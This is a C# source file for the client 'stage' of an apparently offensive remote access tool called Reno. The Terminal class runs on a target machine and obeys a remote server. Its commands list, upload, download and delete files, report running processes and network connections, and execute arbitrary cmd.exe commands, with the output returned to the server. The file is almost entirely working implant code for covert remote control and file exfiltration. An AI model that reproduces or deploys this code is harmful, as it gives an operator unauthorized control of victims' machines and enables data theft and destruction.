﻿using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Net;
using Reno.Comm;
using System.IO.Compression;
using System.Collections.Generic;
using System.Threading;

namespace Reno.Stages
{
    /// <summary>
    /// The Terminal class is meant to run on a target machine and allow for interaction with the TerminalServer.
    /// It supports the following basic commands: ls, cd, pwd, delete, upload, download, netstat, ps, and exit.
    /// </summary>
    public class Terminal
    {
        CommChannel channel;
        string pwd = ".";

        /// <summary>
        /// Constructor for the Terminal program to be placed on the client machine
        /// </summary>
        /// <param name="channel">Communications channel to the server</param>
        public Terminal(CommChannel channel)
        {
            this.channel = channel;
        }

        /// <summary>
        /// Main loop for the terminal. Loop continues to listen to commands from the server until told to disconnect
        /// </summary>
        public void Execute()
        {
            bool run = true;
            while (run)
            {
                try
                {
                    // Wait for a header - once its received execute the command
                    CommHeader header = channel.ReceiveHeader();
                    switch (header.Command)
                    {
                        case CommChannel.EXIT:
                            run = false;
                            channel.Close();
                            break;
                        case CommChannel.LS:
                            if (header.DataLength == 0)
                            {
                                SendDirectoryListing(pwd, header);
                            }
                            else
                            {
                                byte[] dirBytes = channel.ReceiveBytes(header.DataLength);
                                string sDir = Encoding.UTF8.GetString(channel.Decompress(dirBytes));
                                SendDirectoryListing(sDir, header);
                            }
                            break;
                        case CommChannel.PWD:
                            SendPresentWorkingDirectory(header);
                            break;
                        case CommChannel.CD:
                            if (header.DataLength == 0)
                            {
                                Console.WriteLine("No argument");
                                pwd = "C:\\";
                                SendChangeDirectory(pwd, header);
                            }
                            else
                            {
                                byte[] dirBytes = channel.ReceiveBytes(header.DataLength);
                                string tmpDir = Encoding.UTF8.GetString(channel.Decompress(dirBytes));
                                SendChangeDirectory(tmpDir, header);
                            }
                            break;
                        case CommChannel.DELETE:
                            // Deletes a file or directory provided as an argument
                            byte[] objectToDelete = channel.ReceiveBytes(header.DataLength);
                            string fileSystemObject = Encoding.UTF8.GetString(channel.Decompress(objectToDelete));
                            // Do some checking on the string - if the object is not fully qualified, make it
                            // I.e delete c:\Users.txt should be used if supplied
                            // i.e. delete users.txt should expand users.txt to pwd + \users.txt
                            Regex fullPath = new Regex(@"^\\\\|^\\|^[a-zA-z]:\\");
                            if (!fullPath.IsMatch(fileSystemObject))
                            {
                                fileSystemObject = Path.Combine(pwd, Path.GetFileName(fileSystemObject));
                            }
                            DeleteFileSystemObject(header, fileSystemObject);
                            break;
                        case CommChannel.UPLOAD:
                            byte[] fileToUpload = channel.Decompress(channel.ReceiveBytes(header.DataLength));
                            string fileUpload = GetFullPath(Encoding.UTF8.GetString(fileToUpload));
                            Console.WriteLine("[*] File upload requested for {0}", fileUpload);
                            CommHeader fileHeader = channel.ReceiveHeader();
                            UploadFile(fileHeader, fileUpload);
                            break;
                        case CommChannel.DOWNLOAD:
                            byte[] fileToDownload = channel.Decompress(channel.ReceiveBytes(header.DataLength));
                            string fileDownload = GetFullPath(Encoding.UTF8.GetString(fileToDownload));
                            Console.WriteLine("[*] File download requested for {0}", fileDownload);
                            DownloadFile(header, fileDownload);
                            break;
                        case CommChannel.NETSTAT:
                            SendNetstat(header);
                            break;
                        case CommChannel.PS:
                            SendProcessList(header);
                            break;
                        case CommChannel.EXECUTE:
                            ExecuteCommand(header);
                            break;
                    }
                }
                catch(IOException ioe)
                {
                    Console.WriteLine("[-] Error with the stream - possible disconnect - {0}", ioe.Message);
                    run = false;
                }
                catch(Exception e)
                {
                    Console.WriteLine("[-] Unknown error in main terminal loop - {0}", e.Message);
                    run = false;
                }
            }
        }
        /// <summary>
        /// This is a helper function to receives a file uploaded from the server.
        /// This function does things differently than the others when it comes to compression.
        /// If the CommChannel is compression, the function receives the fully compressed file 
        /// fomr the server and then decompresses it.
        /// </summary>
        /// <param name="header">CommHeader that was sent from the server</param>
        /// <param name="file">File to receive</param>
        private void UploadFile(CommHeader header, string file)
        {
            if (header.Compression == CommChannel.NONE)
            {
                // Receive the uncompressed file
                try
                {
                    using (FileStream fs = new FileStream(GetFullPath(file), FileMode.Create))
                    {
                        long received = 0;
                        long size = header.DataLength;
                        while(received < size)
                        {
                            if(size - received < CommChannel.CHUNK_SIZE)
                            {
                                fs.Seek(received, SeekOrigin.Begin);
                                byte[] b = channel.ReceiveBytes((int)(size - received));
                                fs.Write(b, 0, (int)(size - received));
                                received += (size - received);
                            }
                            else
                            {
                                fs.Seek(received, SeekOrigin.Begin);
                                byte[] b = channel.ReceiveBytes(CommChannel.CHUNK_SIZE);
                                fs.Write(b, 0, CommChannel.CHUNK_SIZE);
                                received += CommChannel.CHUNK_SIZE;
                            }
                        }
                    }
                }
                catch(IOException ioex)
                {
                    Console.WriteLine("[-] Error receiving the file: {0}", ioex.Message);
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] Unknown error receiving the file: {0}", e.Message);
                }
            }
            else
            {
                try
                {
                    // Create the tmp file
                    using (FileStream tmpStream = new FileStream("tmp", FileMode.Create))
                    {
                        long received = 0;
                        long size = header.DataLength;
                        while (received < size)
                        {
                            if (size - received < CommChannel.CHUNK_SIZE)
                            {
                                tmpStream.Seek(received, SeekOrigin.Begin);
                                byte[] b = channel.ReceiveBytes((int)(size - received));
                                tmpStream.Write(b, 0, (int)(size - received));
                                received += (size - received);
                            }
                            else
                            {
                                tmpStream.Seek(received, SeekOrigin.Begin);
                                byte[] b = channel.ReceiveBytes(CommChannel.CHUNK_SIZE);
                                tmpStream.Write(b, 0, CommChannel.CHUNK_SIZE);
                                received += CommChannel.CHUNK_SIZE;
                            }
                        }
                    }

                    // Decompress the file
                    using (FileStream tmpStream = new FileStream("tmp", FileMode.Open))
                    {
                        if (header.Compression == CommChannel.GZIP)
                        {
                            using (FileStream fs = new FileStream(GetFullPath(file), FileMode.Create))
                            {
                                using (GZipStream gzip = new GZipStream(tmpStream, CompressionMode.Decompress))
                                {
                                    gzip.CopyTo(fs);
                                }
                            }
                        }
                        else if (header.Compression == CommChannel.DEFLATE)
                        {
                            using (FileStream fs = new FileStream(GetFullPath(file), FileMode.Create))
                            {
                                using (DeflateStream deflate = new DeflateStream(tmpStream, CompressionMode.Decompress))
                                {
                                    deflate.CopyTo(fs);
                                }
                            }
                        }
                    }
                    // Delete the tmp file
                    FileInfo tmp = new FileInfo("tmp");
                    if (tmp.Exists)
                        tmp.Delete();
                }
                catch (IOException ioex)
                {
                    Console.WriteLine("[-] Error receiving the compressed file: {0}", ioex.Message);
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] Unknown error receiving the compressed file: {0}", e.Message);
                }
            }
        }
        /// <summary>
        /// This is a helper function to allow the server to download a file from the client.
        /// This function does things differntly than the others when it comes to compression.
        /// If the CommChannel is compressed, this function compresses the file in that compression
        /// method and then transmits it. The corresponding function on the server then decompresses.
        /// </summary>
        /// <param name="header">CommHeader that was sent from the server</param>
        /// <param name="file">File to download</param>
        private void DownloadFile(CommHeader header, string file)
        {
            // Get the file and transmit
            if (File.Exists(file))
            {
                FileInfo fileInfo = new FileInfo(file);
                FileInfo tmp = new FileInfo("tmp.file");
                string fileToRead;
                // Compress the file if compression is on
                if (header.Compression == CommChannel.GZIP)
                {
                    
                    using (FileStream fsRead = fileInfo.OpenRead())
                    {
                        using (FileStream fsWrite = new FileStream(tmp.FullName, FileMode.Create))
                        {
                            using (GZipStream gs = new GZipStream(fsWrite, CompressionLevel.Optimal))
                            {
                                fsRead.CopyTo(gs);
                            }
                        }
                    }
                }
                else if(header.Compression == CommChannel.DEFLATE)
                {
                    using (FileStream fsRead = fileInfo.OpenRead())
                    {
                        using (FileStream fsWrite = new FileStream(tmp.FullName, FileMode.Create))
                        {
                            using (DeflateStream ds = new DeflateStream(fsWrite, CompressionLevel.Optimal))
                            {
                                fsRead.CopyTo(ds);
                            }
                        }
                    }
                }
                long size;
                if (header.Compression != CommChannel.NONE) {
                    size = tmp.Length;
                    fileToRead = tmp.FullName;
                    Console.WriteLine(size);
                }
                else {
                    fileToRead = file;
                    size = fileInfo.Length;
                }
                long bytesSent = 0;
                int read = 0;
                byte[] bytes = new byte[CommChannel.CHUNK_SIZE];
                CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, (int)size);    // Change the (int)size to eventually long
                channel.SendHeader(h);
                // Chunk the file and send
                while (bytesSent < size)
                {
                    read = 0;
                    try
                    {
                        using (FileStream fileStream = new FileStream(fileToRead, FileMode.Open))
                        {
                            if (size - bytesSent < CommChannel.CHUNK_SIZE)
                            {
                                byte[] b = new byte[size - bytesSent];
                                fileStream.Seek(bytesSent, SeekOrigin.Current);
                                read = fileStream.Read(b, 0, (int)(size - bytesSent));
                                bytesSent += read;
                                channel.SendBytes(b);
                            }
                            else
                            {
                                fileStream.Seek(bytesSent, SeekOrigin.Current);
                                read = fileStream.Read(bytes, 0, CommChannel.CHUNK_SIZE);
                                bytesSent += read;
                                channel.SendBytes(bytes);
                            }
                        }
                    }
                    catch(IOException ioEx)
                    {
                        Console.WriteLine("Error with filestream for download: {0}", ioEx.Message);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("Error during download: {0}", e.Message);
                    }
                }
                // Delete the tmp file
                tmp.Delete();
            }
            // Send error if the file doesnt exist
            else
            {
                CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.ERROR, header.Id, 0);
                channel.SendHeader(h);
            }
        }
        /// <summary>
        /// Helper function to get the full path of the filesystem object(file or directory) supplied
        /// This way, anything sent as a relative path is converted to fully qualified and used
        /// </summary>
        /// <param name="s">File system object to check</param>
        /// <returns>Fully quallified path</returns>
        private string GetFullPath(string s)
        {
            string path = "";
            // Do some checking on the string - if the object is not fully qualified, make it
            Regex fullPath = new Regex(@"^\\\\|^\\|^[a-zA-z]:\\");
            if (!fullPath.IsMatch(s))
            {
                path = Path.Combine(pwd, Path.GetFileName(s));
            }
            else
            {
                path = s;
            }
            return path;
        }
        /// <summary>
        /// Helper function to delete a file or directory on the host
        /// </summary>
        /// <param name="header">CommHeader that was sent from the server</param>
        /// <param name="fsObject">File or directory to delete</param>
        private void DeleteFileSystemObject(CommHeader header, string fsObject)
        {
            string returnMessage = "";
            if (File.Exists(fsObject))
            {
                // Try to delete the file
                try
                {
                    File.Delete(fsObject);
                    returnMessage = "File deleted";
                    byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(returnMessage));
                    CommHeader deleteHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
                    channel.SendHeader(deleteHeader);
                    channel.SendBytes(bytes);
                }
                catch (ArgumentException e)
                {
                    returnMessage = "Error deleting file " + e.Message;
                    byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(returnMessage));
                    CommHeader deleteHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
                    channel.SendHeader(deleteHeader);
                    channel.SendBytes(bytes);
                }
            }
            else if (Directory.Exists(fsObject))
            {
                try
                {
                    Directory.Delete(fsObject);
                    returnMessage = "Directory deleted";
                    byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(returnMessage));
                    CommHeader deleteHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
                    channel.SendHeader(deleteHeader);
                    channel.SendBytes(bytes);
                }
                catch (Exception e)
                {
                    returnMessage = "Error deleting directory " + e.Message;
                    byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(returnMessage));
                    CommHeader deleteHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
                    channel.SendHeader(deleteHeader);
                    channel.SendBytes(bytes);
                }
            }
            else
            {
                returnMessage = "No such file system object";
                byte[] bytes = Encoding.UTF8.GetBytes(returnMessage);
                CommHeader deleteHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
                channel.SendHeader(deleteHeader);
                channel.SendBytes(bytes);
            }
        }
        /// <summary>
        /// Helper function to sent tasklist output to the server
        /// </summary>
        /// <param name="header">CommHeader that was sent from the server</param>
        private void SendProcessList(CommHeader header)
        {
            Process ps = new Process();
            ProcessStartInfo psInfo = new ProcessStartInfo();
            psInfo.FileName = "tasklist.exe";
            psInfo.WindowStyle = ProcessWindowStyle.Hidden;
            psInfo.UseShellExecute = false;
            psInfo.RedirectStandardOutput = true;
            ps.StartInfo = psInfo;
            ps.Start();
            string output = ps.StandardOutput.ReadToEnd();
            byte[] psBytes = channel.Compress(Encoding.UTF8.GetBytes(output));
            CommHeader psHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, psBytes.Length);
            channel.SendHeader(psHeader);
            channel.SendBytes(psBytes);
        }
        /// <summary>
        /// Helper function to send the netstat output
        /// </summary>
        /// <param name="header">The CommHeader that was sent from the server</param>
        private void SendNetstat(CommHeader header)
        {
            Process netstat = new Process();
            ProcessStartInfo netstatInfo = new ProcessStartInfo();
            netstatInfo.FileName = "netstat.exe";
            netstatInfo.Arguments = "-ant";
            netstatInfo.UseShellExecute = false;
            netstatInfo.RedirectStandardOutput = true;
            netstat.StartInfo = netstatInfo;
            netstat.Start();
            string netstatOutput = netstat.StandardOutput.ReadToEnd();
            byte[] netstatBytes = channel.Compress(Encoding.UTF8.GetBytes(netstatOutput));
            CommHeader netstatHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, netstatBytes.Length);
            channel.SendHeader(netstatHeader);
            channel.SendBytes(netstatBytes);
        }
        /// <summary>
        /// Helper function to execute shell commands
        /// </summary>
        /// <param name="header">The CommHeader that was sent from the server</param>
        private void ExecuteCommand(CommHeader header)
        {
            Process command = new Process();
            ProcessStartInfo commandInfo = new ProcessStartInfo();
            string commandString = "/C ";
            // Read the command string
            byte[] bytes = channel.Decompress(channel.ReceiveBytes(header.DataLength));
            string commandArgs = Encoding.UTF8.GetString(bytes);
            commandString += commandArgs;
            commandInfo.FileName = "cmd.exe";
            commandInfo.Arguments = commandString;
            commandInfo.UseShellExecute = false;
            commandInfo.RedirectStandardOutput = true;
            command.StartInfo = commandInfo;
            command.Start();
            string commandOutput = command.StandardOutput.ReadToEnd();
            byte[] commandBytes = channel.Compress(Encoding.UTF8.GetBytes(commandOutput));
            CommHeader commandHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, commandBytes.Length);
            channel.SendHeader(commandHeader);
            if (commandBytes.Length > 0)    
                channel.SendBytes(commandBytes);
        }
        /// <summary>
        /// Helper function to print out the directory listing
        /// </summary>
        /// <param name="directory">String of the directory to print out</param>
        /// <param name="header">The CommHeader that was sent from the server</param>
        private void SendDirectoryListing(string directory, CommHeader header)
        {
            string output = "";
            if (Directory.Exists(directory))
            {
                DirectoryInfo dir = new DirectoryInfo(directory);
                Console.WriteLine("Directory {0}", dir.FullName);
                output += dir.FullName + "\n";

                foreach (DirectoryInfo i in dir.EnumerateDirectories())
                {
                    output += i.FullName + "\n";
                }
                foreach (string file in Directory.EnumerateFiles(directory))
                {
                    output += file + "\n";
                }
                Console.WriteLine(output);
                byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(output));
                CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
                channel.SendHeader(h);
                channel.SendBytes(bytes);
            }
        }

        /// <summary>
        /// Helper function to print out the present working directory
        /// </summary>
        /// <param name="header">The CommHeader that was sent from the server</param>
        private void SendPresentWorkingDirectory(CommHeader header)
        {
            DirectoryInfo pwdInfo = new DirectoryInfo(pwd);
            byte[] msg = channel.Compress(Encoding.UTF8.GetBytes(pwdInfo.FullName));
            CommHeader pwdHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, msg.Length);
            Console.WriteLine("[*] Sending {0}", pwdInfo.FullName);
            channel.SendHeader(pwdHeader);
            channel.SendBytes(msg);
        }

        /// <summary>
        /// Helper function to change the current working directory
        /// </summary>
        /// <param name="directory">String of the directory to change to</param>
        /// <param name="header">The CommHeader that was sent from the server</param>
        private void SendChangeDirectory(string directory, CommHeader header)
        {
            if (Directory.Exists(directory))
            {
                pwd = directory;
            }
            byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(pwd));
            CommHeader cdHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
            channel.SendHeader(cdHeader);
            channel.SendBytes(bytes);
        }

        /// <summary>
        /// Creates a new CommHeader for transmission
        /// </summary>
        /// <param name="command">Command to execute</param>
        /// <param name="compression">Compression method that is used</param>
        /// <param name="type">Type of message: Command or Response</param>
        /// <param name="id">Message Id</param>
        /// <param name="data_length">Length of data</param>
        /// <returns></returns>
        private CommHeader CreateHeader(byte command, byte compression, byte type, int id, int data_length)
        {
            return new CommHeader(command, compression, type, 0, id, data_length);
        }
    }
}
